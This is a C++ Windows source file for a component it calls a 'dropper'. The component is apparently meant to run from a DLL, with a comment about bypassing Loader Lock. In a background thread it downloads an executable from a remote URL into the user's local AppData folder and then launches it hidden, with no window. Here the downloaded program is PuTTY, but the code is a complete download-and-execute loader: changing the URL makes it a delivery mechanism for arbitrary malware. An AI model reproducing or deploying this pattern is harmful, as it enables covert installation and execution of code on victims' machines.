#include "dropper.h"
#include <windows.h>
#include <urlmon.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <string>
#include <fstream>
#include <iomanip>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shlwapi.lib")

static void LogDropperDebug(const std::string& msg) {
    std::ofstream ofs("debug_log.txt", std::ios::app);
    if (ofs.is_open()) {
        ofs << "[Task1] " << msg << std::endl;
    }
}

// Thread payload to bypass Loader Lock
DWORD WINAPI DropperThread(LPVOID lpParam) {
    try {
        LPCSTR url = "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe";
        char szPath[MAX_PATH];
        
        if (!ExpandEnvironmentStringsA("%LOCALAPPDATA%\\putty.exe", szPath, MAX_PATH)) {
            LogDropperDebug("Failed to expand %LOCALAPPDATA%");
            return 1;
        }

        std::ofstream pathDbg("path_debug.txt");
        if(pathDbg.is_open()) {
            pathDbg << szPath << std::endl;
        }

        DeleteFileA(szPath);

        LogDropperDebug("Starting download...");
        HRESULT hr = URLDownloadToFileA(NULL, url, szPath, BINDF_GETNEWESTVERSION, NULL);
        if (hr != S_OK) {
            DWORD err = GetLastError();
            std::ofstream errLog("error_log.txt");
            if(errLog.is_open()) {
                errLog << hr << std::endl;
            }
            LogDropperDebug("URLDownloadToFile failed. HRESULT: " + std::to_string(hr));
            return 1;
        }
        LogDropperDebug("Download succeeded.");

        if (GetFileAttributesA(szPath) == INVALID_FILE_ATTRIBUTES) {
            LogDropperDebug("Downloaded file does NOT exist at path.");
            return 1;
        }
        LogDropperDebug("File exists at absolute path: confirmed.");

        Sleep(5000); // give the download time to finish writing to the disk

        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;      
        ZeroMemory(&pi, sizeof(pi));

        if (CreateProcessA(
            szPath,    
            NULL,                
            NULL,                
            NULL,                
            FALSE,               
            CREATE_NO_WINDOW,    
            NULL,                
            NULL,                
            &si,                 
            &pi                  
        )) {
            LogDropperDebug("CreateProcess succeeded.");
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return 0;
        } else {
            LogDropperDebug("CreateProcess failed. Error: " + std::to_string(GetLastError()));
        }
        return 1;
    } catch (...) {
        LogDropperDebug("Exception caught.");
        return 1;
    }
}

bool DownloadPutty() {
    HANDLE hThread = CreateThread(NULL, 0, DropperThread, NULL, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
        return true;
    }
    return false;
}
